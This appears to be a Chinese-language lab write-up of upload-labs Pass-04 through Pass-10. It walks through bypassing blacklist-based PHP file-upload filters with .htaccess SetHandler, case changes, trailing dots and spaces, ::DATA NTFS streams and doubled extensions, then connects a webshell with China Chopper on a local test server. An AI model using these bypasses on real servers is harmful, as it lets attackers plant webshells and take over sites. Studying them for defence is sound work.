<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210717101506612.png" alt="image-20210717101506612"></p>
<p>采用黑名单时，过滤后缀不全，我们可以尝试<code>.phtml</code>, <code>.php3</code>和<code>.php5</code>这样的后缀。</p>
<h1 id="Pass-04-htaccess绕过（Apache-特性）"><a href="#Pass-04-htaccess绕过（Apache-特性）" class="headerlink" title="Pass-04 - .htaccess绕过（Apache 特性）"></a>Pass-04 - .htaccess绕过（Apache 特性）</h1><h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><p>先上传一个<code>shell.php</code>，提示<img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210717101648489.png" alt="image-20210717101648489">，抓包抓到了，说明此处时后端检测文件。</p>
<p>再次按第三关的思路上传<code>.phtml</code>, <code>.php3</code>和<code>.php5</code>这样的后缀，发现也被检测了。于是我们尝试上传**.htaccess**文件，内容为：<code>SetHandler application/x-httpd-php</code></p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210717102255081.png" alt="image-20210717102255081"></p>
<p>再次上传任意后缀的shell木马,即可被解析成php文件</p>
<h2 id="方法总结-3"><a href="#方法总结-3" class="headerlink" title="方法总结"></a>方法总结</h2><blockquote>
<p>概述来说，htaccess文件是<a href="https://baike.baidu.com/item/Apache">Apache</a>服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页<a href="https://baike.baidu.com/item/301%E9%87%8D%E5%AE%9A%E5%90%91">301重定向</a>、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
</blockquote>
<p>这一关我们就利用<code>.htaccess</code>文件指定所有文件后缀均解析为<code>php</code>，可见过滤<code>.htaccess</code>也尤为重要</p>
<h1 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 - 大小写绕过"></a>Pass-05 - 大小写绕过</h1><h2 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h2><p>观察源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>发现<code>.htaccess</code>在黑名单了，但我发现<code>PHP</code>并未被禁止，于是尝试抓包上传PHP后缀文件</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724141808920.png" alt="image-20210724141808920"></p>
<p>成功上传并得到文件地址，使用菜刀连接即可。</p>
<h2 id="方法总结-4"><a href="#方法总结-4" class="headerlink" title="方法总结"></a>方法总结</h2><p>这关虽然过滤了<code>.htaccess</code>，但与第四关不同的是，他去掉了<code>$file_ext = strtolower($file_ext); //转换为小写</code>的操作，导致我们能使用大写字符绕过检测。再次证明，采用黑名单的形式来检测文件上传是不可靠的！</p>
<h1 id="Pass-06-后缀名末尾的空格绕过（Windows特性）"><a href="#Pass-06-后缀名末尾的空格绕过（Windows特性）" class="headerlink" title="Pass-06 - 后缀名末尾的空格绕过（Windows特性）"></a>Pass-06 - 后缀名末尾的空格绕过（Windows特性）</h1><h2 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h2><p>观察源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);<span class="comment">//查找到 . 最后一次出现的位置，获取从该位置开始一直到文件末尾的字符</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br></pre></td></tr></table></figure>

<p>我们发现此处与之前的关卡相比，少了<strong>首尾去空</strong>的操作：<code>$file_ext = trim($file_ext); //首尾去空</code>。</p>
<p>那么这关是怎么处理文件名的呢 - 先删除末尾的点，查找到 <code>.</code> 最后一次出现的位置，获取从该位置开始一直到文件末尾的字符，再转换成小写、去掉<code>::$DATA</code>字符后得到最终的后缀名，去和上面的<code>deny_ext</code>做对比。那么我们可以想办法构造它的后缀名。</p>
<p>在Windows中，后缀名最后是不能带空格的，那么我们可以构造<code>shell.php .</code>，这样经过处理后，这里过滤器得到的后缀是<code>.php[空格] </code>，而黑名单中并没有此文件，于是绕过了过滤。加上在Windows中，就算我们上传的后缀名尾部是带空格的，系统也会在保存文件的时候自动给我们去掉空格，这样我们可以直接访问<code>shell.php</code>。</p>
<p>那么我们来测试下：</p>
<p> <img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724143037092.png" alt="image-20210724143037092"></p>
<p>成功连接菜刀。</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724143207754.png" alt="image-20210724143207754"></p>
<h2 id="方法总结-5"><a href="#方法总结-5" class="headerlink" title="方法总结"></a>方法总结</h2><p>学会阅读源码和查阅资料很重要。</p>
<p>比如</p>
<ul>
<li><p>这里的<code>strrchr()</code>方法是指查找到指定字符最后一次出现的位置，并获取从该位置开始一直到文件末尾的字符。</p>
</li>
<li><p>Windows中，后缀名最后是不能带空格的，会被自动去掉。</p>
</li>
</ul>
<p>有能力通过了解作者的代码，找出逻辑漏洞，这是学会Web安全的必要条件。</p>
<h1 id="Pass-07-后缀名末尾的点绕过（Windows特性）"><a href="#Pass-07-后缀名末尾的点绕过（Windows特性）" class="headerlink" title="Pass-07 - 后缀名末尾的点绕过（Windows特性）"></a>Pass-07 - 后缀名末尾的点绕过（Windows特性）</h1><h2 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h2><p>这一关，我们看源码，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>相比前一关，发现其并没有对末尾的点做处理。</p>
<p>根据<strong>Windows</strong>的特性 - 后缀名最后的点会被自动去掉，我们可以构造文件名<code>shell.php.</code>，这样获取到的后缀是<code>.</code>，能够绕过黑名单。在文件被保存在<code>windows</code>系统上后，后缀名最后的<code>.</code>会被自动去掉，我们访问<code>shell.php</code>即可。</p>
<p>演示：</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724144725750.png" alt="image-20210724144725750"></p>
<p>菜刀连接成功：</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724144838086.png" alt="image-20210724144838086"></p>
<h2 id="方法总结-6"><a href="#方法总结-6" class="headerlink" title="方法总结"></a>方法总结</h2><p>根据<strong>Windows</strong>的特性，后缀名最后的点会被自动去掉。利用逻辑漏洞解出题目。</p>
<h1 id="Pass-08-DATA文件流绕过（Windows特性）"><a href="#Pass-08-DATA文件流绕过（Windows特性）" class="headerlink" title="Pass-08 - $DATA文件流绕过（Windows特性）"></a>Pass-08 - $DATA文件流绕过（Windows特性）</h1><h2 id="NTFS文件流"><a href="#NTFS文件流" class="headerlink" title="NTFS文件流"></a>NTFS文件流</h2><p>在做这关之前，我们需要了解以下<code>NTFS</code>文件流。</p>
<blockquote>
<p><code>NTFS</code> 是微软 <code>NT</code> 系列内核支持的较为安全先进的磁盘文件格式。 <code>NTFS</code> 数据交换流（简称 <code>ADS</code> ）是 <code>NTFS</code> 磁盘的一个特性。每个文件都可以存在多个数据流，虽然我们无法看到数据流文件，但是它却是可以真实存在于我们的系统中的。</p>
</blockquote>
<p>平时我们看见的文件，其实它的全名是这样的：</p>
<p><code>&lt;filename&gt;:&lt;stream name&gt;:&lt;streamtype&gt;</code></p>
<p>即</p>
<p><code>&lt;文件名&gt;:&lt;流名称&gt;:&lt;流类型&gt;</code></p>
<p>用户不能创建一个新的流类型，流类型都是以$开头。</p>
<p>所有的<strong>文件</strong>在<code>NTFS</code>上，<strong>都至少包含一个流：主流（即DATA流）</strong>。</p>
<p>默认的<code>DATA</code>流是没有<strong>stream name</strong>的，如果一个文件被指派了流，但该流没有<strong>stream type</strong>的话，在储存时会自动添加<code>$DATA</code>，但在访问查询的时候需要去掉<code>$DATA</code>。</p>
<p>对于文件夹而言，没有<code>DATA</code>流，它的主流是<code>directory</code>流，( <code>stream type</code> 为 <code>$INDEX_ALLOCATION</code> ), <code>directory</code> 流默认的 <code>stream name</code> 是 <code>$130</code> 。</p>
<p>尽管文件夹默认没有 <code>data</code> 流，但用户可以指派 <code>data</code> 流。</p>
<h2 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h2><p>观察源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"> <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"> <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"> <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"> <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"> <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>发现此处并未检测<code>::Data</code></p>
<p>根据上文所讲，我们抓包修改上传文件名为<code>shell.php::DATA</code>，即指定文件名为<code>shell.php</code>，无流名，流类型为<code>DATA</code>。</p>
<p>当我们上传以后，过滤器判断出后缀是<code>.php::DATA</code>，黑名单中未查询到，于是我们可以绕过检测。但Windows文件在保存的时候，该数据流的格式名不会显示，所以实际上还是以<code>shell.php</code>的名字保存在服务器上的。</p>
<p>那么我们就可以开始操作了：</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724152210037.png" alt="image-20210724152210037"></p>
<p>连接菜刀成功！</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210724152308213.png" alt="image-20210724152308213"></p>
<h2 id="方法总结-7"><a href="#方法总结-7" class="headerlink" title="方法总结"></a>方法总结</h2><p>Windows上的NTFS文件流帮助我们绕过后缀检测。这个有时间要好好了解下，后期还会遇到和NTFS文件流有关的绕过。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.gushiciku.cn/pl/2y05">Windows下的ADS NTFS交换数据流</a></p>
<h1 id="Pass-09-点空格点绕过-Windows特性"><a href="#Pass-09-点空格点绕过-Windows特性" class="headerlink" title="Pass-09 - 点空格点绕过(Windows特性)"></a>Pass-09 - 点空格点绕过(Windows特性)</h1><h2 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h2><p>观察源码，发现和<strong>pass07</strong>其实没有什么区别，这一关加了去掉末尾的点，但只去掉了一次。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>

<p>如果我们文件名是<code>. .</code>，删除文件名末尾的点后，文件后缀变成了<code>.[空格]</code>，接着去掉空格，最终检测的后缀名为<code>.</code>，这不是和<strong>Pass-09</strong>一样吗？</p>
<p>直接上burp修改：</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210729144343197.png" alt="image-20210729144343197"></p>
<p>上传成功。</p>
<p>上菜刀即可</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210729144504045.png" alt="image-20210729144504045"></p>
<h2 id="方法总结-8"><a href="#方法总结-8" class="headerlink" title="方法总结"></a>方法总结</h2><p>还是分析源码，找出逻辑问题。</p>
<p>了解Windows的特性，后缀名末尾的点或空格会被自动去掉。</p>
<h1 id="Pass-10-关键字替换绕过"><a href="#Pass-10-关键字替换绕过" class="headerlink" title="Pass-10 - 关键字替换绕过"></a>Pass-10 - 关键字替换绕过</h1><h2 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h2><p>我们直接上传一个<code>php</code>文件<code>shell.php</code>，发现上传成功。<img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210729150201358.png" alt="image-20210729150201358"></p>
<p>复制看看文件地址，发现文件地址是<code>http://127.0.0.1/upload/shell.</code>后面的php被去掉了，那么我们猜测应该是触发了黑名单，然后后缀名被替换为空了。</p>
<p>观察代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);<span class="comment">//替换deny_ext中的后缀为空</span></span><br></pre></td></tr></table></figure>

<p>那么我们可以构造以下文件名</p>
<p>test.p<strong>php</strong>hp</p>
<p>这样检测到<code>php</code>字段并替换为空，这样我们上传的文件名仍然为<code>test.php</code>。</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210729150320292.png" alt="image-20210729150320292"></p>
<p>连接菜刀：<img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210729150350556.png" alt="image-20210729150350556"></p>
<h2 id="方法总结-9"><a href="#方法总结-9" class="headerlink" title="方法总结"></a>方法总结</h2><p>直接替换非法后缀名是很不安全的，尽量使用白名单检测。</p>
<p>相对的，对于替换后缀名检测的方法，我们可以选择重复后缀进行绕过。</p>
